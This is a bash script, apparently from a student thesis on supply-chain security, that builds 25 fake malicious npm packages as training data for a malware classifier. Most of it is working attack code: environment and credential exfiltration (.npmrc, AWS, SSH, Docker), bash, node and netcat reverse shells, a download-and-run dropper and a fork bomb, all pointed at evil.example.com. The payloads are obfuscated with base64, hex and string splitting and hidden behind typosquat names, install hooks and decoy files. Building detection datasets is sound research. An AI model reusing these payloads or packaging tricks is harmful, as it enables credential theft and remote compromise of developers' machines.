#!/usr/bin/env bash
# =============================================================================
#  generate_malicious_corpus.sh
#  Corpus synthetique de 25 paquets npm malveillants pour le PoC ZTSC
#  Adlal KHERAZ - Memoire de fin d'etudes - Ecole-IT 2025-2026
# =============================================================================
#  Ce script produit 25 archives .tgz (mal-pkg-1.tgz a mal-pkg-25.tgz)
#  destinees a l'entrainement d'un classifieur Random Forest (Phase 5).
#
#  Pour eviter l'overfitting, la generation introduit une forte variance sur
#  trois axes orthogonaux :
#    AXE 1 : le hook d'execution  (preinstall / postinstall / prepare / index)
#    AXE 2 : l'action malveillante (exfil env / reverse shell / drop binaire
#                                    / fork bomb / credential harvest)
#    AXE 3 : la technique d'obfuscation (clair / base64 / concat / hex /
#                                         eval / child_process indirect)
#
#  La combinaison de ces 3 axes assure que le modele ML apprend les
#  caracteristiques comportementales, pas la signature textuelle.
#
#  USAGE   :  chmod +x generate_malicious_corpus.sh && ./generate_malicious_corpus.sh
#  SORTIE  :  ./dataset/malicious/mal-pkg-1.tgz ... mal-pkg-25.tgz
#  SECURITE:  Toutes les charges ciblent evil.example.com (RFC 2606) et
#             ne realisent aucune action reelle. Les paquets sont INERTES
#             tant qu'ils ne sont pas installes avec npm install ; les
#             executer ailleurs que dans le PoC isole est a vos risques.
# =============================================================================

set -euo pipefail

# ---------------------------------------------------------------------------
#  CONFIGURATION
# ---------------------------------------------------------------------------
OUTPUT_DIR="${OUTPUT_DIR:-./dataset/malicious}"
WORK_DIR="${WORK_DIR:-./.tmp_mal_build}"
NUM_PACKAGES=25
C2_HOST="evil.example.com"     # RFC 2606 reserve pour la documentation
C2_PORT=4444
LOG_FILE="${OUTPUT_DIR}/generation.log"

# ---------------------------------------------------------------------------
#  COULEURS TERMINAL
# ---------------------------------------------------------------------------
if [[ -t 1 ]]; then
  CL_RST=$'\033[0m'; CL_CYAN=$'\033[1;36m'; CL_GRN=$'\033[1;32m'
  CL_YLW=$'\033[1;33m'; CL_RED=$'\033[1;31m'; CL_DIM=$'\033[2m'
else
  CL_RST=""; CL_CYAN=""; CL_GRN=""; CL_YLW=""; CL_RED=""; CL_DIM=""
fi

log_step() { printf "%s[%02d/%02d]%s %s\n" "$CL_CYAN" "$1" "$NUM_PACKAGES" "$CL_RST" "$2"; }
log_info() { printf "%s[INFO]%s %s\n"  "$CL_GRN" "$CL_RST" "$1"; }
log_warn() { printf "%s[WARN]%s %s\n"  "$CL_YLW" "$CL_RST" "$1"; }
log_err()  { printf "%s[ERR] %s %s\n"  "$CL_RED" "$CL_RST" "$1"; }

# ---------------------------------------------------------------------------
#  DICTIONNAIRES DE VARIATION
# ---------------------------------------------------------------------------
#  Noms credibles pour masquer les paquets (typosquats + packages-dependance-
#  like). Ils ne seront JAMAIS publies : usage strictement local.
PKG_NAMES=(
  "expres-utils"      "lodash-enhanced"   "react-dom-helper"  "axios-retry-v2"
  "moment-timezone-x" "chalk-colors-pro"  "webpack-loader-js" "debug-logger-v2"
  "dotenv-parser-x"   "commander-cli"     "jest-runner-alt"   "eslint-config-v3"
  "prettier-format"   "typescript-types"  "socket-io-client"  "passport-oauth2"
  "bcrypt-hasher"     "winston-logger"    "cors-handler-v2"   "body-parser-json"
  "mongoose-odm-x"    "cheerio-scraper"   "nodemailer-smtp"   "rollup-plugin-v2"
  "vue-router-next"
)

AUTHORS=(
  "npm-dev"           "opensource-team"   "nodejs-foundation" "js-community"
  "frontend-devs"     "backend-guild"     "web-arch-team"     "dev-tools-org"
)

# Descriptions credibles (aucune ne doit sembler suspecte au humain pressee)
DESCRIPTIONS=(
  "Utility library for modern JavaScript"
  "High performance helpers for Node.js"
  "Common patterns for web applications"
  "Toolkit for reactive frontends"
  "Efficient parser and serializer"
  "Async utilities for production workloads"
  "Developer tools for JS projects"
  "Lightweight helpers with zero dependencies"
)

# ---------------------------------------------------------------------------
#  GENERATION DES CHARGES MALVEILLANTES
# ---------------------------------------------------------------------------

#  Payload exfiltration d'environnement via curl (variante claire)
payload_exfil_curl_clear() {
  printf 'require("child_process").exec("curl -s http://%s/steal?d=" + Buffer.from(JSON.stringify(process.env)).toString("base64"));' "$C2_HOST"
}

#  Payload exfiltration via wget (variante claire)
payload_exfil_wget_clear() {
  printf 'require("child_process").exec("wget -q -O- http://%s/env --post-data \\\"" + process.env.HOME + "\\\"");' "$C2_HOST"
}

#  Payload exfiltration obfusquee en base64 (charge integrale encodee)
payload_exfil_base64() {
  local inner
  inner=$(printf 'require("child_process").exec("curl http://%s/x -d $(env|base64 -w0)")' "$C2_HOST")
  local b64
  b64=$(printf '%s' "$inner" | base64 -w0)
  printf 'eval(Buffer.from("%s","base64").toString());' "$b64"
}

#  Payload exfiltration par concatenation de chaines (echappe les greps naifs)
#  ATTENTION : ce payload est INTENTIONNELLEMENT furtif. Les mots-cles
#  "child_process", "exec" et "http" sont decoupes puis reassembles a
#  l'execution. Un detecteur fonde sur de simples regex ne le verra PAS.
#  C'est une des raisons pour lesquelles le modele Random Forest doit
#  apprendre des features structurelles (longueur, densite de concatenation)
#  plutot que du keyword matching. Voir memoire section 3.2.4.
payload_exfil_concat() {
  cat <<EOS
var a="ch"+"ild_pro"+"cess";var b="ex"+"ec";var c="cur"+"l -s ht"+"tp://${C2_HOST}/c?=";require(a)[b](c+Object.keys(process.env).join(":"));
EOS
}

#  Reverse shell bash (variante claire)
payload_revshell_bash() {
  printf 'require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/%s/%s 0>&1\\"");' "$C2_HOST" "$C2_PORT"
}

#  Reverse shell node (stdlib uniquement, sans bash)
payload_revshell_node() {
  cat <<EOS
var net=require("net"),cp=require("child_process");
var s=new net.Socket();s.connect(${C2_PORT},"${C2_HOST}",function(){
  var sh=cp.spawn("/bin/sh",[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);
});
EOS
}

#  Reverse shell obfusque (hex)
payload_revshell_hex() {
  local s="require('child_process').exec('nc -e /bin/sh ${C2_HOST} ${C2_PORT}')"
  # Convertit chaque caractere en hex escape
  local hex=""
  local i
  for ((i=0; i<${#s}; i++)); do
    hex+=$(printf '\\x%02x' "'${s:$i:1}")
  done
  printf 'eval("%s");' "$hex"
}

#  Drop de binaire factice via wget
payload_drop_binary() {
  printf 'require("child_process").exec("wget -q http://%s/miner -O /tmp/.cache_upd && chmod +x /tmp/.cache_upd && /tmp/.cache_upd &");' "$C2_HOST"
}

#  Drop de binaire via curl + execution detachee
payload_drop_curl_detach() {
  cat <<EOS
var cp=require("child_process");
cp.exec("curl -sf http://${C2_HOST}/x.sh | bash",{detached:true,stdio:"ignore"}).unref();
EOS
}

#  Fork bomb simulee (tres agressive, ne pas executer)
payload_fork_bomb() {
  printf 'require("child_process").exec(":(){ :|:& };:");'
}

#  Credential harvest : lit les fichiers .npmrc et .ssh/id_rsa et les exfiltre
payload_cred_harvest() {
  cat <<EOS
var fs=require("fs"),cp=require("child_process"),os=require("os");
var h=os.homedir();
try{
  var data={npm:fs.readFileSync(h+"/.npmrc","utf8").substring(0,200)};
  cp.exec("curl -s -X POST http://${C2_HOST}/c -d "+JSON.stringify(data));
}catch(e){}
EOS
}

#  Credential harvest via child_process indirect (require chaine)
payload_cred_indirect() {
  cat <<EOS
var r=require;var m=["fs","os","child_process"];var fs=r(m[0]),os=r(m[1]),cp=r(m[2]);
var files=[".aws/credentials",".ssh/config",".docker/config.json"];
files.forEach(function(f){
  try{var d=fs.readFileSync(os.homedir()+"/"+f,"utf8");
  cp[m[2].slice(0,4)]("curl http://${C2_HOST}/f?=" + Buffer.from(d).toString("base64"))}catch(e){}
});
EOS
}

#  Tableau : liste des 10 fonctions de payload disponibles
PAYLOAD_FUNCS=(
  payload_exfil_curl_clear
  payload_exfil_wget_clear
  payload_exfil_base64
  payload_exfil_concat
  payload_revshell_bash
  payload_revshell_node
  payload_revshell_hex
  payload_drop_binary
  payload_drop_curl_detach
  payload_fork_bomb
  payload_cred_harvest
  payload_cred_indirect
)

#  Tableau des hooks npm possibles
HOOKS=("preinstall" "postinstall" "prepare" "install" "index")
#  "index" n'est pas un hook : la charge est executee seulement si le paquet
#  est require() par l'application. Cela simule les attaques "dormantes".

# ---------------------------------------------------------------------------
#  FONCTIONS UTILITAIRES
# ---------------------------------------------------------------------------
#  Selection pseudo-aleatoire mais DETERMINISTE a partir d'un index :
#  le meme index i produit toujours le meme tirage. Cela garantit que le
#  corpus est reproductible (exigence academique : Annexe D du memoire).
pick_from_array() {
  local -n arr=$1
  local idx=$2
  local mod=$(( idx % ${#arr[@]} ))
  printf '%s' "${arr[$mod]}"
}

#  Version : genere X.Y.Z ou X varie de 1 a 3, Y de 0 a 9, Z de 0 a 9
gen_version() {
  local i=$1
  printf '%d.%d.%d' $(( (i % 3) + 1 )) $(( (i * 3) % 10 )) $(( (i * 7) % 10 ))
}

#  Genere le package.json selon le hook choisi.
#  - Si hook = index : pas de script lifecycle, la charge est dans index.js
#  - Sinon           : la charge est dans setup.js, appele par node setup.js
#                       depuis le hook (evite l enfer de l echappement JSON
#                       inline dans scripts. Realisme : Backstabber proc\u00e8de
#                       ainsi pour des paquets comme colors-dom, flatmap-stream)
build_package_json() {
  local name=$1 version=$2 author=$3 desc=$4 hook=$5

  if [[ "$hook" == "index" ]]; then
    cat <<JSON
{
  "name": "${name}",
  "version": "${version}",
  "description": "${desc}",
  "main": "index.js",
  "author": "${author}",
  "license": "MIT",
  "keywords": ["utility", "nodejs", "helpers"]
}
JSON
  else
    cat <<JSON
{
  "name": "${name}",
  "version": "${version}",
  "description": "${desc}",
  "main": "index.js",
  "scripts": {
    "${hook}": "node setup.js"
  },
  "author": "${author}",
  "license": "MIT",
  "keywords": ["utility", "nodejs", "helpers"]
}
JSON
  fi
}

#  Genere index.js
#  - Si hook = index : contient la charge malveillante reelle (attaque dormante)
#  - Sinon           : stub legitime pour ne pas eveiller de soupcons a la
#                      relecture humaine (realisme Backstabber)
build_index_js() {
  local hook=$1 payload=$2
  if [[ "$hook" == "index" ]]; then
    cat <<JS
// utility module with on-demand initialization
(function(){
${payload}
module.exports = { version: "1.0.0", ready: true };
})();
JS
  else
    cat <<'JS'
// Utility module - exports helpers
function noop() { return true; }
function identity(x) { return x; }
module.exports = {
  noop: noop,
  identity: identity,
  version: require("./package.json").version
};
JS
  fi
}

#  Genere setup.js (charge malveillante executee par le hook lifecycle).
#  Seulement pertinent quand hook != index.
build_setup_js() {
  local payload=$1
  cat <<JS
// Post-install setup routine
try {
${payload}
} catch (e) { /* silent */ }
JS
}

# ---------------------------------------------------------------------------
#  INITIALISATION
# ---------------------------------------------------------------------------
mkdir -p "$OUTPUT_DIR" "$WORK_DIR"
: > "$LOG_FILE"

log_info "Corpus cible : ${OUTPUT_DIR}"
log_info "Dossier de travail : ${WORK_DIR}"
log_info "C2 factice (non resolvable) : ${C2_HOST}:${C2_PORT}"
printf '\n%s=== DEBUT DE GENERATION (%s paquets) ===%s\n\n' "$CL_CYAN" "$NUM_PACKAGES" "$CL_RST"

#  En-tete du log CSV (utile pour documenter le corpus dans l'Annexe D)
echo "id,filename,name,version,hook,payload_type,description" > "${OUTPUT_DIR}/corpus_manifest.csv"

# ---------------------------------------------------------------------------
#  BOUCLE PRINCIPALE DE GENERATION
# ---------------------------------------------------------------------------
for i in $(seq 1 "$NUM_PACKAGES"); do

  # --- Selection des axes de variance ---
  #  Chaque axe utilise un decalage prime avec la taille de son tableau
  #  pour garantir une couverture maximale des combinaisons possibles sur
  #  les 25 paquets generes (evite les boucles courtes).
  pkg_name="$(pick_from_array PKG_NAMES      $(( i - 1 )))"
  author="$(pick_from_array AUTHORS          $(( i + 2 )))"
  desc="$(pick_from_array DESCRIPTIONS       $(( i + 5 )))"
  hook="$(pick_from_array HOOKS              $(( i + 1 )))"
  # payload : formule 'i' visite les 12 payloads uniformement
  payload_fn="$(pick_from_array PAYLOAD_FUNCS $(( i - 1 )))"
  version="$(gen_version "$i")"

  # Generation de la charge malveillante (appel de la fonction)
  payload="$("$payload_fn")"

  # Identifiant court du type de payload pour le manifest
  payload_short="${payload_fn#payload_}"

  # --- Nom final de l'archive ---
  tgz_name="mal-pkg-${i}.tgz"
  pkg_dir="${WORK_DIR}/mal-pkg-${i}/package"

  # --- Creation de la structure du paquet ---
  # Note : npm pack exige que le contenu soit dans un sous-dossier "package/"
  mkdir -p "$pkg_dir"

  # Generation du package.json (sans payload inline - cleanliness)
  build_package_json "$pkg_name" "$version" "$author" "$desc" "$hook" \
    > "${pkg_dir}/package.json"

  # Generation de index.js
  build_index_js "$hook" "$payload" > "${pkg_dir}/index.js"

  # Generation de setup.js (uniquement si un hook lifecycle est utilise)
  if [[ "$hook" != "index" ]]; then
    build_setup_js "$payload" > "${pkg_dir}/setup.js"
  fi

  # Ajout d'un README credible (certains paquets Backstabber en ont)
  cat > "${pkg_dir}/README.md" <<EOF
# ${pkg_name}

${desc}

## Installation
\`\`\`
npm install ${pkg_name}
\`\`\`

## Usage
\`\`\`js
const lib = require("${pkg_name}");
lib.identity(42);
\`\`\`
EOF

  # --- Compression avec tar (format attendu par npm) ---
  tar --owner=0 --group=0 --numeric-owner \
      -czf "${OUTPUT_DIR}/${tgz_name}" \
      -C "${WORK_DIR}/mal-pkg-${i}" \
      package/

  # --- Log de l'entree dans le manifest ---
  printf '%d,%s,%s,%s,%s,%s,"%s"\n' \
    "$i" "$tgz_name" "$pkg_name" "$version" "$hook" "$payload_short" "$desc" \
    >> "${OUTPUT_DIR}/corpus_manifest.csv"

  log_step "$i" "${tgz_name}  |  hook=${CL_YLW}${hook}${CL_RST}  |  payload=${CL_DIM}${payload_short}${CL_RST}"

done

# ---------------------------------------------------------------------------
#  NETTOYAGE DES DOSSIERS TEMPORAIRES
# ---------------------------------------------------------------------------
printf '\n%s=== NETTOYAGE ===%s\n' "$CL_CYAN" "$CL_RST"
rm -rf "$WORK_DIR"
log_info "Dossier de travail supprime : ${WORK_DIR}"

# ---------------------------------------------------------------------------
#  STATISTIQUES DE DIVERSITE DU CORPUS (controle qualite)
# ---------------------------------------------------------------------------
printf '\n%s=== STATISTIQUES DE DIVERSITE ===%s\n' "$CL_CYAN" "$CL_RST"

# Diversite des hooks
printf '\n%sRepartition des hooks :%s\n' "$CL_GRN" "$CL_RST"
awk -F',' 'NR>1 {print $5}' "${OUTPUT_DIR}/corpus_manifest.csv" \
  | sort | uniq -c | sort -rn | awk '{printf "  %-15s %d fois\n", $2, $1}'

# Diversite des payloads
printf '\n%sRepartition des payloads :%s\n' "$CL_GRN" "$CL_RST"
awk -F',' 'NR>1 {print $6}' "${OUTPUT_DIR}/corpus_manifest.csv" \
  | sort | uniq -c | sort -rn | awk '{printf "  %-30s %d fois\n", $2, $1}'

# Volumetrie finale
printf '\n%sVolumetrie :%s\n' "$CL_GRN" "$CL_RST"
num_tgz=$(find "$OUTPUT_DIR" -maxdepth 1 -name 'mal-pkg-*.tgz' | wc -l)
total_size=$(du -sh "$OUTPUT_DIR" | cut -f1)
printf '  %-30s %d archives\n' "Paquets generes" "$num_tgz"
printf '  %-30s %s\n' "Taille totale du corpus" "$total_size"
printf '  %-30s %s\n' "Manifest CSV" "${OUTPUT_DIR}/corpus_manifest.csv"

# ---------------------------------------------------------------------------
#  FIN
# ---------------------------------------------------------------------------
printf '\n%s=== GENERATION TERMINEE AVEC SUCCES ===%s\n' "$CL_GRN" "$CL_RST"
printf '\nProchaine etape  : lancer Phase 4 extraction des features\n'
printf '  python3 scripts/extract_features.py\n\n'
